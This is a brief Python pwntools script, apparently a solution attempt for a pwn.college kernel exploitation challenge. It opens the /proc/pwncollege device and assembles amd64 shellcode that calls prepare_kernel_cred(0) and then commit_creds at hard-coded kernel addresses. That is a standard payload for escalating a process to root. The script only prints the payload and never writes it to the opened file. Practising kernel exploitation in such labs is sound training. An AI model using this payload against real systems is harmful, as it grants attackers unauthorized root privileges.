from pwn import *
context.arch = 'amd64'

f = open("/proc/pwncollege","w")

prepare_kernel_cred = 0xffffffff810890c0

commit_creds = 0xffffffff81088d80

payload = asm(f'''
    xor rdi, rdi
    mov rbx, {prepare_kernel_cred}
    call rbx
    mov rdi, rax
    mov rbx, {commit_creds}
    call rbx
    ret
''')

print(payload)